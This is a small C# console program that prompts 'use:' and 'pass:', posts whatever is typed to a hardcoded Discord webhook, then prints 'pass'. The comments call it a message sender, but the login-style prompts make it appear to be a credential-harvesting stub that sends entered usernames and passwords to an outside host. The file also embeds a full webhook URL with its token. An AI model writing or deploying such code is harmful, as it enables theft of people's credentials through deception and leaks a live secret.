using System;
using System.Net.Http;
using System.Net.Http.Json;
using System.Threading.Tasks;

class Program
{
    static readonly string webhookUrl = "https://discord.com/api/webhooks/1380939169576128605/CcUsulYThoo-JXCb_o57puETv1apV3nNVu2xz80vrd8yjo-Chd0Ec4HRlV-knkRGYu14";

    static async Task SendToDiscord(string username, string message)
    {
        using (HttpClient client = new HttpClient())
        {
            var payload = new
            {
                username = username, // Webhook's displayed name
                content = message // Message content entered by user
            };

            await client.PostAsJsonAsync(webhookUrl, payload);
        }
    }

    static async Task Main()
    {
        while (true) // Keep the console open for multiple messages
        {
            Console.Write("use: "); // Fake user input
            string username = Console.ReadLine();

            Console.Write("pass: "); // Message input
            string message = Console.ReadLine();

            await SendToDiscord(username, message);

            Console.WriteLine("pass"); // Display "pass" in the terminal
        }
    }
}